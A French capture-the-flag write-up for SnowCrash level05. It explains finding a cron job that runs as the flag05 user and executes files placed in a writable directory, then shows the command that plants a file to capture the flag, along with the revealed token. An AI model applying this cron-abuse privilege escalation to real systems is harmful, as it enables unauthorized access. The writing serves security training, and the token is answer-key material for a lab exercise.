# Explication

En arrivant sur la session du level05 on reçoit une alert comme quoi on a recu un email, on va donc lire les fichiers dans `/var/mail/`:

```
level05@SnowCrash:~$ ls /var/mail/
level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

en cherchant `*/2 * * * *` on tombe sur [ce site](https://crontab.guru/#*/2_*_*_*_*) qui nous informe que c'est une **cron** et que toute les 2 minutes la commande qui la suit va s'executer  
On va donc regarder ce que va faire ce programme
```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

On peu voir que avec un interval de 5s le programme va executer tout les fichier du dossier `/opt/openarenaserver/`  
On va donc créer un fichier qui va écrire le token dans `/tmp/level05`

```
echo "getflag > /tmp/level05" > /opt/openarenaserver/level05
```

Au bout de quelque instant le fichier `/tmp/level05` est crée
```
cat /tmp/level05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```